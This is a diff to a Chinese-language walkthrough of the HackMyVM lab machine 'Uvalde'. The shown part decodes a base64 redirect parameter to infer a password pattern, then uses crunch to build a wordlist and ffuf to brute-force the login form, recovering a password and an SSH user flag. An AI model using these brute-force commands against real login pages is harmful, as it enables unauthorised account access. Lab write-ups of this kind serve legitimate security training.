@@ -2,6 +2,8 @@
 
 2025.02.21 https://hackmyvm.eu/machines/machine.php?vm=Uvalde
 
+[video](https://www.bilibili.com/video/BV1keAfevEet/?spm_id_from=333.1387.homepage.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)
+
 ## Ip
 
 192.168.5.40
@@ -28,9 +30,9 @@ Location: success.php?dXNlcm5hbWU9dGVzdDEmcGFzc3dvcmQ9dGVzdDEyMDI1QDIxOTE=
 解密后得到 username=test1&password=test12025@2191 使用此凭据登陆，没发现什么内容。经过多次注册，发现用户的密码格式为: 用户名+年@四位随机数，进行密码字典构造，尝试破解 matthew 用户的密码：
 
 ```
-crunch 16 16 -t dddddddddddd%%%% -p matthew2025@ -o pass.txt
+crunch 16 16 -t matthew2023@%%%%  -l xxxxxxxxxxx@xxxx -o pass.txt
 
-crunch 16 16 -t matthew2025@%%%%  -l aaaaaaaaaaa@aaaaa
+ffuf -t 100 -ac -c -w pass.txt -u http://192.168.5.40/login.php -X POST -d 'username=matthew&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded'
 ```
 
 爆破出密码：matthew2023@1554 ssh 登陆该用户，得到 user flag：
